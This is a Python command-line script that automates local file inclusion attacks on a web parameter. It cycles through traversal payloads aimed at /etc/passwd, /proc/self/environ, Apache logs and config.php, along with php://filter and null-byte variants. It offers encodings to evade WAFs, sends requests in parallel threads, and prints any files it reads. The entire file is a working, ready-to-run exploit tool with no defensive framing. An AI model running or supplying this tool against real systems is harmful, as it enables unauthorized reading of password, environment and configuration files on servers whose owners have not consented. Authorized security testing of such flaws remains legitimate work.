import requests
import argparse
import threading
import logging
import base64
import urllib.parse

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("lfi_exploits.log"),
        logging.StreamHandler()
    ]
)

# LFI Payloads
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/hosts",
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../proc/self/environ",
    "../../../../../../var/www/html/config.php",
    "php://filter/convert.base64-encode/resource=index.php",  # PHP Filter Bypass
    "/etc/passwd%00",  # Null Byte Injection
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%2500",
    "../../../../../../etc/passwd%252e%252e%252f",
]

class LFIExploiter:
    def __init__(self, url, param, encoding=None, cookies=None, headers=None, threads=5):
        self.url = url
        self.param = param
        self.encoding = encoding
        self.cookies = cookies
        self.headers = headers
        self.threads = threads

    def encode_payload(self, payload):
        """Applies encoding techniques to evade WAFs."""
        if self.encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif self.encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif self.encoding == "single_url":
            return urllib.parse.quote(payload)
        return payload  # No encoding applied

    def test_payload(self, payload):
        """Tests a single payload against the target URL."""
        encoded_payload = self.encode_payload(payload)
        full_url = f"{self.url}?{self.param}={encoded_payload}"

        try:
            logging.info(f"[*] Testing: {full_url}")
            response = requests.get(full_url, cookies=self.cookies, headers=self.headers, timeout=10)

            if "root:x" in response.text:  # Indicator of successful file read
                logging.info(f"[+] SUCCESS: {payload} /etc/passwd exposed!")
                print(response.text)
            elif "LogFile" in response.text or "Apache" in response.text:
                logging.info(f"[+] Log file found using {payload}")
            elif response.status_code == 200:
                logging.info(f"[!] Possible LFI detected with {payload}")

        except requests.RequestException as e:
            logging.error(f"[!] Request failed: {e}")

    def run(self):
        """Runs the LFI exploit with multithreading."""
        threads = []
        for payload in LFI_PAYLOADS:
            if len(threads) >= self.threads:
                for thread in threads:
                    thread.join()
                threads = []
            thread = threading.Thread(target=self.test_payload, args=(payload,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

class CLI:
    @staticmethod
    def parse_args():
        parser = argparse.ArgumentParser(description="LFI Exploiter")
        parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/index.php)")
        parser.add_argument("-p", "--param", required=True, help="Vulnerable parameter (e.g., page, file, path)")
        parser.add_argument("-e", "--encoding", choices=["base64", "double_url", "single_url"], help="Encoding technique to bypass WAF")
        parser.add_argument("-c", "--cookies", nargs="*", default=[], help="Session cookies (e.g., PHPSESSID=123456)")
        parser.add_argument("-H", "--headers", nargs="*", default=[], help="Custom headers (e.g., Authorization: Bearer token)")
        parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent requests (default: 5)")

        args = parser.parse_args()

        headers_dict = {h.split(":")[0]: h.split(":")[1] for h in args.headers} if args.headers else {}
        cookies_dict = {c.split("=")[0]: c.split("=")[1] for c in args.cookies} if args.cookies else {}

        return args.url, args.param, args.encoding, cookies_dict, headers_dict, args.threads

if __name__ == "__main__":
    try:
        url, param, encoding, cookies, headers, threads = CLI.parse_args()
        logging.info(f"[+] Scanning {url} with parameter '{param}' using {encoding if encoding else 'no'} encoding")

        exploiter = LFIExploiter(url, param, encoding, cookies, headers, threads)
        exploiter.run()

    except KeyboardInterrupt:
        logging.warning("[-] Scan interrupted by user.")
    except Exception as e:
        logging.error(f"[-] Error: {e}")
